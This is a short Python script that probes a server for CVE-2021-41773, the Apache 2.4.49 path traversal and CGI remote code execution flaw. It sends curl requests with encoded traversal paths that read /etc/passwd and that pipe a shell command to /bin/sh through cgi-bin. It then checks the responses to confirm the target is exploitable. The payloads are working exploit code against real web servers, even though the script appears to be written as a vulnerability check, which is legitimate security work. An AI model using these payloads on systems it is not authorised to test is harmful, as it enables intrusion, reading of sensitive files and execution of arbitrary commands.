from subprocess import getoutput
import sys

# Apache 2.4.49 path traversal and remote code execution if mod_cgi is enabled

def main():
    payloads = [
        ("root:", f"\"{sys.argv[1]}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\""),
        ("root:", f"\"{sys.argv[1]}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\""),
        ("CVE-2021-41773", f"-d 'echo Content-Type: text/plain; echo; echo 37714-1202-EVC | rev' \"{sys.argv[1]}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh\""),
    ]

    for (match, payload) in payloads:
        if match in getoutput(f"curl -s --path-as-is {payload}"):
            exit(0)

    exit(1)

if __name__ == "__main__":
    main()

